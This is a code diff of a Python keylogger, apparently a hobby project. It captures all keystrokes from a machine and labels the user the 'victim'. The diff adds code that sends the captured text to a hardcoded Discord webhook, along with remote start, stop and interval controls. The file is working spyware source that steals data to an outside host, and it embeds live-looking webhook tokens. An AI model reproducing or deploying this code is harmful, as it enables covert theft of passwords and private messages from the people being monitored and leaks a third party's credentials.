@@ -1,16 +1,22 @@
-import keyboard, os
+#Written and designed by Stone Preheim
 from threading import Timer
 
+import keyboard
+from discord import Webhook, RequestsWebhookAdapter
+import os
+
 #will need to post directly to webhook since i want to run in thread
-WEBHOOK = "https://discord.com/api/webhooks/828777990267338763/2tCn0R5OIniq2uNhPYmowWDuemiyi0iZKaVVmyN5aPCZMT_qvwjqtTQZJtMdeY4eKlNM"
-INTER = 5
+WEBHOOK = "https://discord.com/api/webhooks/947727566226202634/St1laTDd5koi49lss-IqtYJrcHgYpNrv11pV-ED2g4AYo_yPj_g4K-yLyWzMrZJHXwNk"
+webControl = Webhook.from_url(WEBHOOK, adapter=RequestsWebhookAdapter())#didnt need an async adapter here so just using requests
 
 class Keylogger:
-    def __init__(self, interval, method="discord"):
+    def __init__(self, interval, method="discord", botID = ''):
         self.INTERVAL = interval
         self.method = method
+        self.botID = botID
         self.victimString = ''
         self.victimName = os.getlogin()
+        self.isRunning = False
 
     def outputKeys(self):
         """
@@ -18,7 +24,10 @@ class Keylogger:
         I connect this class with the controller. Also wanting to provide
         support for outputting to file/email in stretch.
         """
-        print(self.victimString)
+        if self.method == 'discord':
+            webControl.send(username=f'{self.botID}', content=self.victimString)#send content to webhook
+        else:
+            print(self.victimString)
         self.victimString = ''
 
     def cleanPresses(self, event):
@@ -37,7 +46,10 @@ class Keylogger:
                 n = ''
             elif n == "backspace":
                 n = '\n[back]'
-        self.victimString += n
+            elif n == "ctrl":
+                n = '\n[ctrl]'
+        if self.isRunning == True:
+            self.victimString += n
 
     def startTimer(self):
         if self.victimString:
@@ -51,6 +63,19 @@ class Keylogger:
         self.startTimer()
         keyboard.wait()#execute forever thread will close from discord controller eventually
 
+    def stopReading(self):
+        print("reading is stopping")
+        self.isRunning = False #should allow for thread to exit gracefully
+        self.victimString = '' #clear string
+
+    def startReading(self):
+        self.isRunning = True
+        self.victimString = ''  # clear string
+
+    def changeInterval(self, newInt = 5):
+        self.INTERVAL = newInt
+
+
 if __name__ == '__main__':
-    logger = Keylogger(interval=INTER)
+    logger = Keylogger(interval=5)
     logger.mainLoop()
